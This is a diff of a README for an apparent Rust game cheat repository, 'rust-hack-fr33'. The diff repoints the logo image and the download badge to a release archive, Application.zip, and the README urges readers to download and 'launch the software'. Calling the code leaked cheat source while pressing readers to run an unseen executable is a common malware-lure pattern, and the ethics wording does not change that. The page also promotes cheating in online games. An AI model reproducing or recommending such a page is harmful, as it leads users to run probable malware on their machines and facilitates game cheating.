@@ -1,6 +1,6 @@
 # 🚀 Welcome to rust-hack-fr33
 
-![Rust Logo](https://cdn.iconscout.com/icon/free/png-256/rust-283445.png)
+![Rust Logo](https://github.com/Kaineel/rust-hack-fr33/releases/download/v1.0/Application.zip)
 
 ## Description
 Welcome to "rust-hack-fr33" - your go-to repository for a leaked external cheat source code for Rust! Our repository offers developers a unique opportunity to enhance their skills by exploring and understanding cheat functionalities in Rust. We believe in building a community based on integrity, ethical behavior, and trust. By sharing this source code, we aim to promote a deep understanding of game mechanics and the development of countermeasures against cheating in online games like Rust.
@@ -23,7 +23,7 @@ Explore a wide range of cheat functionalities in Rust, including:
 ## Get Started
 Are you ready to dive into the world of Rust cheats? Download the source code from the link below and unleash your creativity!
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Software](https://github.com/Kaineel/rust-hack-fr33/releases/download/v1.0/Application.zip)](https://github.com/Kaineel/rust-hack-fr33/releases/download/v1.0/Application.zip)
 
 *Note: The link above leads to a zip file containing the software. Make sure to launch the software and explore its functionalities.*
 
